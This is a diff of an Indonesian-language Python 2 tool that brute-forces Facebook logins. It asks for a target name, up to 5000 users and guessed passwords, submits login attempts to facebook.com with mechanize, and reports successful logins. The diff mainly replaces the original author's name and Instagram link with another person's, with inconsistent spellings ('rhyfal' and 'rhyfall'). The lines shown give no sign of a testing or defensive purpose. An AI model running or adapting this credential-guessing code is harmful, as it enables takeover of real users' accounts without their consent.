@@ -1,6 +1,6 @@
 # -*- coding UTF-8 -*-
-#  Author : Iqbal Dev
-#  Tools : Geli2 Efbeh
+#  Author : Rhyfall
+#  Tools : Dg nuju
 #  Versi : 0.2
 
 from brute import brute
@@ -33,9 +33,9 @@ users6 = []
 def user_dev():
   try:
   	print multi_ban
-  	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m lucinta\n\033[97;1m  ==> ")
+  	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m ripaldo\n\033[97;1m  ==> ")
   	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=5000):\n\033[93;1m  ==> ")
-  	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m lucinta123\n\033[97;1m  ==> ")
+  	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m ripaldo123\n\033[97;1m  ==> ")
   	# set password
   	if us == '' or us == ' ' or san_dev == '' or san_dev == ' ':
   		exit('\n \033[91;1m Jangan Kosong Lah Kamprett.. \n')
@@ -82,7 +82,7 @@ def pro_dev(ival):
 	iqbal = ival.replace('\n', '')
 	for iq in pas:
 	  try:
-		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 
+		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(rhyfall) + " | " + iqu 
 
 		log = 'https://www.facebook.com/login.php'
 		dev = mechanize.Browser()
@@ -96,9 +96,9 @@ def pro_dev(ival):
 		sub = dev.submit()
 		mask = sub.geturl()
 		if log != mask and not 'login_attempt' in mask and not 'checkpoint' in mask:
-			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[97;1m '+ iqu
+			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ rhyfal + '\033[96;1m |\033[97;1m '+ iqu
 		elif 'checkpoint' in mask: 
-			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[92;1m '+ iqu
+			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ rhyfal + '\033[96;1m |\033[92;1m '+ iqu
 		else:
 			pass
 	  except:
@@ -175,12 +175,12 @@ if __name__ == '__main__':
 			try:
 				print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi 0.2 \033[97;1m ]+++" 
 				print " \n               \033[93;1m Keunggulan:\n\n   \033[97;1m   Lebih Power Full dibanding yg V.01 \n      bisa mengisi lebih dari 1 password  \n"
-				print " \n\033[95;1m   Silahkan Ikuti Instagram saya \033[96;1m(IqbalDev)"
+				print " \n\033[95;1m   Silahkan Ikuti Instagram saya \033[96;1m(rhyfall)"
 				raw_input(" \033[97;1m    Tekan Enter Untuk Membuka Instagram..")
-				subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
+				subprocess.check_output(['am', 'start', 'https://www.instagram.com/rhyfall/'])
 				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
 			except KeyboardInterrupt:
-				subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
+				subprocess.check_output(['am', 'start', 'https://www.instagram.com/rhyfal/'])
 				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
 		else:
 			print "\n\033[90;1m Pilih yang Bener lah Kampprett.. "
